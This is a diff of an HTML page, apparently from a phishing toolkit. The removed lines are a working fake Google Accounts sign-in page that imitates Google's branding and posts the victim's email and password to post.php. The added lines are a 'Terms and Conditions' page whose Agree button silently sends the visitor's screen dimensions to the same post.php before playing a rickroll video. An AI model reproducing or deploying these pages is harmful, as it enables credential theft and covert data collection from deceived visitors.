@@ -1,150 +1,144 @@
 <!DOCTYPE html>
-<html>
-
-  <head>
-
-    <title>Sign in - Google Accounts</title>
-
-    <meta charset='UTF-8'>
-    <meta http-equiv="cache-control" content="no-cache" />
-    <meta http-equiv="expires" content="0" />
-    <meta http-equiv="pragma" content="no-cache" />
-    <meta name="viewport" content="width=device-width,
-    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow"> 
-
-    <script src="static/js/jquery.min.js"></script>
-
-    <link rel="stylesheet" href="static/css/bootstrap.min.css">
-    <link rel="stylesheet" href="static/css/style.css">
-    <link rel="icon" type="image/png" href="static/img/oc3czvmbvf.png"/>
-
-    <style>
-
-    .google-header-bar {
-    height: 71px;
-    border-bottom: 1px solid #e5e5e5;
-    overflow: hidden;
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Terms and Conditions</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f0f0f0;
     }
-
-    .google-header-bar.centered {
-    border: 0;
-    height: 108px;
+    .container {
+        max-width: 800px;
+        margin: 20px auto;
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        position: relative;
     }
-
-    .google-header-bar.centered .header .logo {
-    float: none;
-    margin: 40px auto 30px;
-    display: block;
-    }
-    .google-header-bar.centered .header .secondary-link {
-    display: none
-    }
-
-    .header .logo {
-    margin: 17px 0 0;
-    float: left;
-    height: 38px;
-    width: 116px;
-    }
-
-    </style>
-
-    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
-
-      .google-header-bar.centered {
-        height: 83px;
-      }
-
-      .google-header-bar.centered .header .logo {
-        margin: 25px auto 20px;
-      }
-
-      .card {
+    h1 {
+        text-align: center;
         margin-bottom: 20px;
-      }
-
-    </style>
-
-    <style media="screen and (max-width: 580px)">
-
-      html,
-      body {
+    }
+    #terms-container {
+        max-height: 200px;
+        overflow-y: auto;
+        padding: 10px;
+        margin-bottom: 20px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+    }
+    #terms {
+        line-height: 1.6;
+        color: #333;
+    }
+    #agree-button {
+        display: block;
+        margin: 20px auto;
+        padding: 10px 20px;
+        background-color: #4CAF50;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+    }
+    #agree-button:hover {
+        background-color: #45a049;
+    }
+    #rickroll-video {
+        display: none;
+        margin: 0 auto;
+    }
+    .decor {
+        position: absolute;
+        bottom: -10px;
+        left: 50%;
+        transform: translateX(-50%);
         font-size: 14px;
-      }
+        color: #888;
+    }
+    .decor:before {
+        content: '';
+        display: block;
+        width: 150px;
+        height: 2px;
+        background-color: #888;
+        position: absolute;
+        top: 50%;
+        left: -170px;
+    }
+    .decor:after {
+        content: '';
+        display: block;
+        width: 150px;
+        height: 2px;
+        background-color: #888;
+        position: absolute;
+        top: 50%;
+        right: -170px;
+    }
+</style>
+</head>
+<body>
 
-      .google-header-bar.centered {
-        height: 73px;
-      }
-
-      .google-header-bar.centered .header .logo {
-        margin: 20px auto 15px;
-      }
-
-      .content {
-        padding-left: 10px;
-        padding-right: 10px;
-      }
-
-      .hidden-small {
-        display: none;
-      }
-
-      .card {
-        padding: 20px 15px 30px;
-        width: 270px;
-      }
-
-      .footer ul li {
-        padding-right: 1em;
-      }
-
-      .lang-chooser-wrap {
-        display: none;
-      }
-
-    </style>
-
-  </head>
-
-  <body>
-
-    <div class="container">
-
-      <div class="google-header-bar centered">
-        <div class="header content clearfix">
-          <img alt="Google" class="logo" src="static/img/dtnk16mcjo.png">
-        </div>
-      </div>
-
-      <h1 class="text-center login-title">Sign in with your Google Account</h1>
-
-        <div class="account-wall">
-
-          <img class="profile-img" src="static/img/yqczrisvt2.png" alt="">
-
-          <form class="form-signin" method="post" action="post.php">
-            <input id="email" type="text" name="email" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
-            <input id="password" type="password" name="password" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
-			
-            <div id="dialog">
-            <h2 id="error">Please enter the required fields.</h2>
-            </div>
-
-            <button id="btn" type="submit" class="btn btn-primary btn-block btn-sharp" name="submit">Sign in</button>
-            <a href="#" class="pull-right need-help">Find my account </a><span class="clearfix"></span>
-          </form>
-
-        </div>
-
-            <br><a href="#" class="text-center new-account">Create an account </a>
-            <center><br><p class="tagline">One Google Account for everything Google</p>
-            <img src="static/img/tmjjgvk28i.png" width="210" height="17" alt=""></center><br><br>
-
-
-
+<div class="container">
+    <h1>Terms and Conditions</h1>
+    <div id="terms-container">
+        <p id="terms">
+            Welcome to Bell767! These terms and conditions outline the rules and regulations for the use.
+            <br><br>
+            	The following terminology applies to these Terms and Conditions, Privacy Statement and Disclaimer Notice and all Agreements: "Client", "You" and "Your" refers to you, the person log on this website and compliant to the Company's terms and conditions. "The Company", "Ourselves", "We", "Our" and "Us", refers to our Company. "Party", "Parties", or "Us", refers to both the Client and ourselves. All terms refer to the offer, acceptance and consideration of payment necessary to undertake the process of our assistance to the Client in the most appropriate manner for the express purpose of meeting the Client's needs in respect of provision of the Company's stated services, in accordance with and subject to, prevailing law of af. Any use of the above terminology or other words in the singular, plural, capitalization and/or he/she or they, are taken as interchangeable and therefore as referring to same.
+            <br><br>
+            Unless otherwise stated, Bell767 and/or its licensors own the intellectual property rights for all material on Bell767. All intellectual property rights are reserved. You may access this from Bell767 for your own personal use subjected to restrictions set in these terms and conditions..
+            <br><br>
+            Without prior approval and written permission, you may not create frames around our Webpages that alter in any way the visual presentation or appearance of our Website.
+        </p>
     </div>
+    <button id="agree-button">Agree</button>
+    <script>
+    document.getElementById('agree-button').addEventListener('click', function() {
+        // Get client screen width and height
+        var screenWidth = window.screen.width;
+        var screenHeight = window.screen.height;
 
-  </body>
+        // Send POST request to the PHP script
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'post.php', true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                console.log('Device information sent successfully!');
+            } else {
+                console.error('Failed to send device information.');
+            }
+        };
+        xhr.onerror = function() {
+            console.error('Error sending request.');
+        };
+        xhr.send('screenWidth=' + screenWidth + '&screenHeight=' + screenHeight);
+    });
+</script>
 
+    <div id="video-container" style="display: none;">
+        <video id="rickroll-video" controls>
+            <source src="rickroll-video.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+</div>
+<div class="decor">Terms and conditions may apply.</div>
+
+<script>
+    document.getElementById('agree-button').addEventListener('click', function() {
+        document.getElementById('video-container').style.display = 'block';
+        document.getElementById('rickroll-video').play();
+    });
+</script>
+
+</body>
 </html>
